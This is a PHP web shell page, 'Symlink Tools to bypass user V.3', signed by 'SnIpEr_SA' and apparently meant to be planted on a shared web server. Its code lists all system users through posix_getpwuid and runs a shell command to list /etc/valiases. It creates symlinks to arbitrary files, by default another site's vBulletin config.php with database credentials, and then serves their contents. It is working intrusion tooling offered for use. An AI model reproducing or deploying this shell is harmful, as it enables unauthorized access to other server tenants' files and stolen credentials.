<title>[p#lg)</title>
<body bgcolor="#000000">
 <style>
BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: olive; }
textarea{background-color:#191919;color:red;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1px solid #666666;}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 13px;font-weight:bold;color: red; font-family: Tahoma; border: 1px solid #666666;height:17}
</style>
<form style="border: 4px ridge #FFFFFF">
<p align="center" dir="rtl"><font color="#FF0000"><span lang="ar-sa"><b>
&nbsp; -=[Symlink Tools to bypass user]V.3 =-
</b>
</span></font></p>
<p align="center" dir="rtl"><font color="#0066FF"><span lang="ar-sa"><b>SnIpEr_SA</b>
</form>
    <div align=center id='n'><font face=tahoma size=2><b>
  <font color="#FFFFFF">o---[</font> <font color="#FF0000">Developer by SnIpEr_SA	 Symlink User Bypass </font> <font color="#FFFFFF">|</font> <a href=http://sniper-sa.com>http://sniper-sa.com</a>
  <font color="#FFFFFF">|</font> <font color="#FF0000">
  <a href="mailto:SnIpEr.SA@hotmail.com" style="text-decoration: none">
  <font color="#FF0000">SnIpEr.SA@hotmail.com</font></a></font><font color="#FFFFFF"> ]---o</font></b></font></div></td></tr></table>
 <form style="border: 4px ridge #FFFFFF">
   <form style="border: 4px ridge #FFFFFF">
     <p align="center">  <b> <td width="50%"><font color=#ffffff>file or folder: ????? ?? ?????? ???????</font></td></b></p>
	<p align="center">
 <input type="text" name="c" value="<?php $line=$_SERVER['DOCUMENT_ROOT']; echo $line . "/vb/includes/config.php"; ?>" size="59">
<tr>
    <td width="50%" colspan="2">
    	</p>
    <p align="center"><input type="submit" value="Submit"></td>
  </tr>

</form>
<form style="border: 4px ridge #FFFFFF">
<td width="50%"><font color=red>users in server:????? ???????? ????????</font></td>
    <td width="50%"><select size=\"1\" name="plugin"><option value="plugin">/etc/passwd</option></option></select></td>

<td width="100%" colspan="2">
    <p align="center"><input type="submit" value="Submit"></td>
    </form>
      <form style="border: 4px ridge #FFFFFF">
    <td width="50%"><font color=red>name sites with user: ????? ??????? ?? ??? ????????</font></td>

     <td width="50%"><select size="1" name="alias"><option value="alias">/etc/valiases</option></option></select></td>

<td width="100%" colspan="2">

    <p align="center"><input type="submit" value="Submit"></td>
  </tr>
  </form>
   <textarea method='POST'  rows=20 cols=100 wrap=off>
<?php

   if ($_GET['alias'] )


      system('ls -al /etc/valiases');




 if ($_GET['plugin'] )

                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";

$k = $_GET['c'];
$flib = "sniper4.txt";

if ($k == "") {
die;
}else{
@unlink($flib);
$sym = $k;
$link = getcwd() . "/" . $flib;
@symlink($sym, $link);
if ($k{0} == "/") {
echo "<script> window.location = '" . $flib . "'</script>";
}else{
echo "<pre><xmp>";
echo readlink($flib) . "\n";
echo "Filesize: " . linkinfo($flib) . "B\n\n";
$ddir = getcwd();
$file2 = str_replace($DOCUMENT_ROOT,'' , $ddir);
$file2 = "http://" . $SERVER_NAME . $filee . $flib;
$result = file_get_contents($file2); echo $result;
}
}
?>